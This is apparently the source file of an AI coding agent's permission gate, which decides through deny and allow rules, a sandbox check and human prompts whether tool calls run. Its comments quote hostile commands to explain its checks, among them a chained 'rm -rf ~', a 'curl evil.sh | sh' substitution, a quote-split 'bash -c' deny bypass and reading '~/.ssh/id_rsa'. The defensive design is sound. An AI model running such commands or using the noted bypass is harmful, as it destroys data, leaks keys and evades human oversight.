import { existsSync, readFileSync } from "node:fs";
import { z } from "zod";
import type { ToolKind } from "../tools/helpers/types.ts";

// The permission gate decides, for every tool call: allow, deny, or ask the human.
//
//   1. deny rules       a match is a hard no, whatever else says yes
//   2. allow rules      yours (settings.json), the built-in safe commands, and "always" answers
//   3. --yolo           allow everything left
//   4. the default      by what the tool can do (its kind) and WHERE it runs (host or sandbox)
//
// Rules look like Claude Code's: a tool name, optionally with a pattern on its main argument.
//   "bash(npm test*)"  "edit(src/*)"  "web_fetch(https://docs.python.org/*)"  "web_fetch"
// One "tool" isn't a tool: "network(registry.npmjs.org)" is a site that commands in the OS
// sandbox may connect to (the sandbox's proxy asks the gate, see env/proxy.ts).
// `*` matches anything (slashes and spaces included). The pattern is matched against the
// command for bash, the path for file tools (relative to the project), and the URL for web_fetch.

export type ApprovalAnswer = "yes" | "no" | "always";
// `always` is the rule that answering "always" would add, so the prompt can show it.
export type AskApproval = (toolName: string, summary: string, always: string) => Promise<ApprovalAnswer>;

export interface PermissionRequest {
  tool: string;
  kind: ToolKind;
  subject: string | null; // command, path (as shown to the model) or URL
  outsideProject: boolean; // a file tool reaching outside the project folder (host mode only)
}

export type Decision = { outcome: "allow"; why: string } | { outcome: "deny"; why: string } | { outcome: "ask" };

interface Rule {
  tool: string;
  pattern: string | null; // null: any call of that tool
  text: string; // as written, for messages
}

// commands that only LOOK at the project skip the prompt.
// They only count as safe when isPlainCommand() agrees (see below).
export const SAFE_COMMANDS = ["ls", "ls *", "pwd", "cat *", "head *", "tail *", "wc *", "git status*", "git diff*", "git log*", "git show*"];

export class PermissionGate {
  private deny: Rule[];
  private allow: Rule[];
  private safe: Rule[] = SAFE_COMMANDS.map((p) => parseRule(`bash(${p})`));
  private session: Rule[] = []; // "always" answers, forgotten when arch-code exits
  private yolo: boolean;
  private isSandboxed: () => boolean; // a function: /sandbox and /docker-sandbox change it mid-session
  private ask: AskApproval;
  private asking: Promise<unknown> = Promise.resolve(); // one question at a time

  constructor(options: { yolo: boolean; sandboxed: boolean | (() => boolean); ask: AskApproval; rules?: RuleLists }) {
    this.yolo = options.yolo;
    const { sandboxed } = options;
    this.isSandboxed = typeof sandboxed === "function" ? sandboxed : () => sandboxed;
    this.ask = options.ask;
    this.allow = (options.rules?.allow ?? []).map(parseRule);
    this.deny = (options.rules?.deny ?? []).map(parseRule);
  }

  decide(req: PermissionRequest): Decision {
    const denied = this.deny.find((r) => matches(r, req, "deny"));
    if (denied) return { outcome: "deny", why: `denied by your rule ${denied.text}` };
    const allowed = [...this.allow, ...this.session].find((r) => matches(r, req, "allow"));
    if (allowed) return { outcome: "allow", why: `rule ${allowed.text}` };
    if (req.tool === "bash" && this.safe.some((r) => matches(r, req, "allow"))) return { outcome: "allow", why: "read-only command" };
    if (this.yolo) return { outcome: "allow", why: "--yolo" };

    switch (req.kind) {
      case "read":
        // Looking inside the project is free. Outside it (~/.ssh, ~/.aws...) is not: whatever the
        // model reads is sent to the model provider, so reading IS sharing.
        return req.outsideProject ? { outcome: "ask" } : { outcome: "allow", why: "read-only" };
      case "edit":
      case "exec":
        // In a sandbox, the agent can only damage a disposable clone, and its work comes back as a
        // branch you review. That's the payoff of sandboxing: autonomy without the prompts.
        return this.isSandboxed() ? { outcome: "allow", why: "sandboxed" } : { outcome: "ask" };
      case "network":
        // web_fetch runs on YOUR machine, outside any sandbox, and a URL can carry data out.
        // Same for a sandboxed command reaching a new site: that's the way data leaves.
        return { outcome: "ask" };
    }
  }

  // When decide() says "ask": put the question to the human. `summary` is what will happen.
  // Questions can now arrive concurrently (a running command's network requests), so they queue.
  async askHuman(req: PermissionRequest, summary: string): Promise<Decision> {
    const turn = this.asking.then(async (): Promise<Decision> => {
      const again = this.decide(req); // an "always" given while this one waited may cover it
      if (again.outcome !== "ask") return again;
      const always = alwaysRule(req);
      const answer = await this.ask(req.tool, summary, always);
      if (answer === "always") this.session.push(parseRule(always));
      return answer === "no" ? { outcome: "deny", why: "the user said no" } : { outcome: "allow", why: "the user said yes" };
    });
    this.asking = turn.catch(() => {});
    return turn;
  }

  // decide(), and ask if needed: for callers that just need a yes or no (the network proxy).
  async authorize(req: PermissionRequest, summary: string): Promise<boolean> {
    const decision = this.decide(req);
    if (decision.outcome !== "ask") return decision.outcome === "allow";
    return (await this.askHuman(req, summary)).outcome === "allow";
  }

  describeRules(): string {
    const list = (rules: Rule[]) => (rules.length ? rules.map((r) => r.text).join(", ") : "(none)");
    return [
      `mode:   ${this.yolo ? "--yolo (no questions)" : this.isSandboxed() ? "sandboxed: edits and bash run without asking; new websites ask" : "ask before edits, bash and web_fetch"}`,
      `deny:   ${list(this.deny)}`,
      `allow:  ${list(this.allow)}`,
      `always: ${list(this.session)}  (this session only)`,
      `safe:   ${SAFE_COMMANDS.join(", ")}  (plain commands only)`,
    ].join("\n");
  }
}

// What "always" remembers. Deliberately narrow: the exact command, the same web host.
// A broader rule is a decision for a calm moment in settings.json, not for a keypress mid-task.
function alwaysRule(req: PermissionRequest): string {
  if ((req.tool === "bash" || req.tool === "network") && req.subject) return `${req.tool}(${req.subject})`;
  if (req.tool === "web_fetch" && req.subject) {
    try {
      return `web_fetch(${new URL(req.subject).origin}/*)`;
    } catch {
      // fall through
    }
  }
  if (req.outsideProject && req.subject) return `${req.tool}(${req.subject})`;
  return req.tool;
}

export function parseRule(text: string): Rule {
  const m = /^\s*([a-z_]+)\s*(?:\((.*)\))?\s*$/s.exec(text);
  if (!m) throw new Error(`Bad permission rule "${text}". Expected tool or tool(pattern), e.g. bash(npm test*).`);
  return { tool: m[1], pattern: m[2] === undefined ? null : m[2], text: text.trim() };
}

function matches(rule: Rule, req: PermissionRequest, use: "allow" | "deny"): boolean {
  if (rule.tool !== req.tool) return false;
  if (rule.pattern === null) return true;
  if (req.subject === null) return false;
  if (req.tool !== "bash") return wildcard(rule.pattern, req.subject);

  // Shell commands are where string rules get fooled. "git status*" would happily allow
  // "git status; rm -rf ~" or "git status $(curl evil.sh | sh)".
  //  - An ALLOW only applies to a plain command: no chaining, pipes, redirects or substitution.
  //  - A DENY is checked against every piece of the command, so "rm*" catches "ls && rm -rf x".
  // Even so: this is a seatbelt, not a wall. `bash -c "r""m -rf x"` gets past any deny rule.
  // Real safety comes from the sandbox.
  if (use === "allow") return isPlainCommand(req.subject) && wildcard(rule.pattern, req.subject.trim());
  return commandPieces(req.subject).some((piece) => wildcard(rule.pattern!, piece));
}

// No shell syntax that could run a second command or write a file, and no paths that leave the
// project (absolute, ~ or ..): `cat ~/.ssh/id_rsa` would send your key to the model provider.
export function isPlainCommand(command: string): boolean {
  const cmd = command.trim();
  if (/[;&|<>`$(){}\n\\*?[\]]/.test(cmd)) return false;
  if (/\s--output(=|\s|$)/.test(cmd)) return false; // git diff --output=FILE writes a file
  return cmd.split(/\s+/).every((word) => !/^['"]?[/~]/.test(word) && !word.includes(".."));
}

function commandPieces(command: string): string[] {
  return command
    .split(/&&|\|\||[;&|\n`]|\$\(|[()]/)
    .map((p) => p.trim())
    .filter(Boolean)
    .concat(command.trim());
}

function wildcard(pattern: string, text: string): boolean {
  const regex = new RegExp(`^${pattern.split("*").map((part) => part.replace(/[.+?^${}()|[\]\\]/g, "\\$&")).join(".*")}$`, "s");
  return regex.test(text);
}

// ── .arch-code/settings.json ──
// {"permissions": {"allow": ["bash(npm test*)"], "deny": ["bash(git push*)"]}}
// A broken file STOPS arch-code instead of being skipped: silently ignoring a typo in a deny
// rule would quietly remove a protection you think you have. Fail closed.

const SettingsSchema = z.object({
  permissions: z
    .object({
      allow: z.array(z.string()).default([]),
      deny: z.array(z.string()).default([]),
    })
    .default({ allow: [], deny: [] }),
});

export type RuleLists = { allow: string[]; deny: string[] };

export function loadRules(file: string): RuleLists {
  if (!existsSync(file)) return { allow: [], deny: [] };
  let json: unknown;
  try {
    json = JSON.parse(readFileSync(file, "utf8"));
  } catch (err) {
    throw new Error(`${file} is not valid JSON: ${(err as Error).message}`);
  }
  const parsed = SettingsSchema.safeParse(json);
  if (!parsed.success) throw new Error(`${file} is invalid:\n${z.prettifyError(parsed.error)}`);
  const rules = parsed.data.permissions;
  for (const text of [...rules.allow, ...rules.deny]) parseRule(text); // throws on a malformed rule
  return rules;
}